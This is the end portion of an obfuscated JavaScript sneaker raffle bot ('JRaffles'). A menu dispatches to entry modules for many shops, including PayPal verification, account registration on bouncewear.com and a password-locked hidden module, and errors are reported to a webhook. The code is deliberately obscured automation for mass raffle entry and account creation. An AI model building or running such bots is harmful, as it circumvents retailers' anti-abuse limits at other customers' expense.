                            var _0x468313 = await _0x2ce8a0(), _0x5d24c2 = await _0x1dbf5e(_0x5f2478);
                            _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x5d24c2), await _0x5f2478['function'](_0x5f2478, _0x5d24c2, _0x468313);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x468313 = await _0x2ce8a0(), _0x5d24c2 = await _0x1dbf5e(_0x5f2478);
                                _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x5d24c2), await _0x5f2478['function'](_0x5f2478, _0x5d24c2, _0x468313);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x468313 = await _0x2ce8a0();
                                    await _0x5f2478['function'](_0x5f2478, _0x468313);
                                }
                            }
                        }
                    } catch (_0x43a92b) {
                        console['log'](_0x43a92b), await _0x468cfd(0x7d0);
                    }
                    return _0x400b89();
                }
                if (_0x2f4215[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                        var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x468313 = await _0x2ce8a0(), _0x1fcf57 = await _0x1dbf5e(_0x5f2478);
                            _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x1fcf57), await _0x5f2478['function'](_0x5f2478, _0x1fcf57, _0x468313);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x468313 = await _0x2ce8a0(), _0x1fcf57 = await _0x1dbf5e(_0x5f2478);
                                _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x1fcf57), await _0x5f2478['function'](_0x5f2478, _0x1fcf57, _0x468313);
                            }
                        }
                    } catch (_0x45386c) {
                        console['log'](_0x45386c), await _0x468cfd(0xfa0);
                    }
                    return _0x400b89();
                }
                if (_0x2f4215[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                        var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x468313 = await _0x2ce8a0(), _0x1fcf57 = await _0x1dbf5e(_0x5f2478);
                            _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x1fcf57), await _0x5f2478['function'](_0x5f2478, _0x1fcf57, _0x468313);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x468313 = await _0x2ce8a0(), _0x1fcf57 = await _0x1dbf5e(_0x5f2478);
                                _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x1fcf57), await _0x5f2478['function'](_0x5f2478, _0x1fcf57, _0x468313);
                            }
                        }
                    } catch (_0x1eb07c) {
                        console['log'](_0x1eb07c), await _0x468cfd(0xfa0);
                    }
                    return _0x400b89();
                }
                if (_0x2f4215[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                    var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x468313 = await _0x2ce8a0();
                        return await _0x5f2478['function'](_0x5f2478, _0x468313), _0x400b89();
                    }
                    var _0x468313 = await _0x2ce8a0(), _0x350a22 = await _0x1dbf5e(_0x5f2478);
                    return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x350a22), await _0x5f2478['function'](_0x5f2478, _0x350a22, _0x468313), _0x400b89();
                }
                if (_0x2f4215[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                    var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x468313 = await _0x2ce8a0(), _0x350a22 = await _0x1dbf5e(_0x5f2478);
                    return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x350a22), await _0x5f2478['function'](_0x5f2478, _0x350a22, _0x468313), _0x400b89();
                }
                if (_0x2f4215[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                    var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x468313 = await _0x2ce8a0(), _0x350a22 = await _0x1dbf5e(_0x5f2478);
                    return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x350a22), await _0x5f2478['function'](_0x5f2478, _0x350a22, _0x468313), _0x400b89();
                }
                if (_0x2f4215[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                    var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x468313 = await _0x2ce8a0(), _0x350a22 = await _0x1dbf5e(_0x5f2478);
                    return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x350a22), await _0x5f2478['function'](_0x5f2478, _0x350a22, _0x468313), _0x400b89();
                } else {
                    if (_0x2f4215[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                        var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x468313 = await _0x2ce8a0(), _0x10c719 = await _0x1dbf5e(_0x5f2478);
                            return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x10c719), await _0x5f2478['function'](_0x5f2478, _0x10c719, _0x468313), _0x400b89();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x468313 = await _0x2ce8a0();
                                return await _0x5f2478['function'](_0x5f2478, null, _0x468313), _0x400b89();
                            }
                        }
                        ;
                    } else {
                        if (_0x2f4215[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                            var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction], _0x468313 = await _0x2ce8a0(), _0x3a26a9 = await _0x1dbf5e(_0x5f2478);
                            return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x3a26a9), await _0x5f2478['function'](_0x5f2478, _0x3a26a9, _0x468313), await _0x468cfd(0x1388), _0x400b89();
                        } else {
                            if (_0x2f4215[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                                var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x468313 = await _0x2ce8a0(), _0x10c719 = await _0x1dbf5e(_0x5f2478);
                                    return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x10c719), await _0x5f2478['function'](_0x5f2478, _0x10c719, _0x468313), _0x400b89();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x468313 = await _0x2ce8a0();
                                        return await _0x5f2478['function'](_0x5f2478, null, _0x468313), _0x400b89();
                                    }
                                }
                                ;
                            } else {
                                if (_0x2f4215[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                                    var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x5f2478);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x2f4215[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                                        var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x468313 = await _0x2ce8a0(), _0x524fb9 = await _0x1dbf5e(_0x5f2478);
                                            return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x524fb9), await _0x5f2478['function'](_0x5f2478, _0x524fb9, _0x468313), _0x400b89();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x468313 = await _0x2ce8a0(), _0x524fb9 = await _0x1dbf5e(_0x5f2478);
                                                return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x524fb9), await _0x5f2478['function'](_0x5f2478, _0x524fb9, _0x468313), _0x400b89();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x2f4215[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                                            var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x468313 = await _0x2ce8a0(), _0x33fa3c = await _0x1dbf5e(_0x5f2478);
                                                return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x33fa3c), await _0x5f2478['function'](_0x5f2478, _0x33fa3c, _0x468313), _0x400b89();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x468313 = await _0x2ce8a0(), _0x33fa3c = await _0x1dbf5e(_0x5f2478);
                                                    return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x33fa3c), await _0x5f2478['function'](_0x5f2478, _0x33fa3c, _0x468313), _0x400b89();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x2f4215[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                                                var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x468313 = await _0x2ce8a0(), _0x267250 = await _0x1dbf5e(_0x5f2478);
                                                    return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x267250), await _0x5f2478['function'](_0x5f2478, _0x267250, _0x468313), _0x400b89();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x468313 = await _0x2ce8a0(), _0x267250 = await _0x1dbf5e(_0x5f2478);
                                                        return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x267250), await _0x5f2478['function'](_0x5f2478, _0x267250, _0x468313), _0x400b89();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x2f4215[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                                                    var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x468313 = await _0x2ce8a0(), _0x3ab6e4 = await _0x1dbf5e(_0x5f2478);
                                                        return _0x2c28ef['shuffleTasks'] && await _0x1096a9(_0x3ab6e4), await _0x5f2478['function'](_0x5f2478, _0x3ab6e4, _0x468313), _0x400b89();
                                                    }
                                                } else {
                                                    if (_0x2f4215[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x468cfd(0x3e8), _0x400b89();
                                                    else {
                                                        if (_0x2f4215[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x4486f5 = _0x2f4215[taskModule]['name'], _0x468313 = await _0x2ce8a0();
                                                            return await _0x320007(_0x4486f5, _0x468313), _0x400b89();
                                                        } else {
                                                            if (_0x2f4215[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x3c6619(_0x2f4215[taskModule]['modules']);
                                                                var _0x5f2478 = _0x2f4215[taskModule]['modules'][taskFunction];
                                                                return await _0x5f2478['function'](_0x5f2478), _0x400b89();
                                                            } else {
                                                                if (_0x2f4215[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x17c0e0 = 0x0;
                                                                    for (const _0x3d975f in _0x2c28ef) {
                                                                        console['log']('(' + _0x17c0e0 + ')\x20' + _0x3d975f + '\x20:\x20' + _0x2c28ef[_0x3d975f]), _0x17c0e0++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x17c0e0 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x53447a = await _0x5cbbd7();
                                                                    if (_0x53447a == _0x17c0e0)
                                                                        return _0x400b89();
                                                                    console['clear'];
                                                                    var _0x15d8fe = 0x0;
                                                                    for (var _0x304441 in _0x2c28ef) {
                                                                        if (_0x53447a == _0x15d8fe) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x304441 + '\x20:'), _0x2c28ef[_0x304441] = await _0x27d151(), _0x51338a['writeFileSync']('../settings.json', JSON['stringify'](_0x2c28ef));
                                                                            break;
                                                                        } else
                                                                            _0x15d8fe++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x468cfd(0xbb8), _0x400b89();
                                                                } else {
                                                                    if (_0x2f4215[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x536afd(), _0x400b89();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x2f4215[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x82d263 = await _0x5d4753();
                                                                            _0x82d263 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x506c2c(), await afewFunction(_0x4fd297[_0x1aaac1], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x468cfd(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x400b89();
            } catch (_0x168f91) {
                return console['log'](_0x168f91), _0x400b89();
            }
        } catch (_0x5aebb5) {
            return console['log'](_0x5aebb5), await _0x468cfd(0x3a98);
        }
}
;
_0x48898b('JRaffles\x20' + _0x9f51f3), _0x536afd();
try {
    _0x35dc41();
} catch (_0x8140a2) {
    var _0x2836ce = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x50fbd1
            },
            {
                'name': 'Version',
                'value': '' + _0x9f51f3
            },
            {
                'name': 'Error',
                'value': '' + _0x8140a2
            }
        ]
    }];
    const _0x2d7a18 = { 'embeds': _0x2836ce };
    _0x4feadc(_0x408671, _0x2d7a18);
}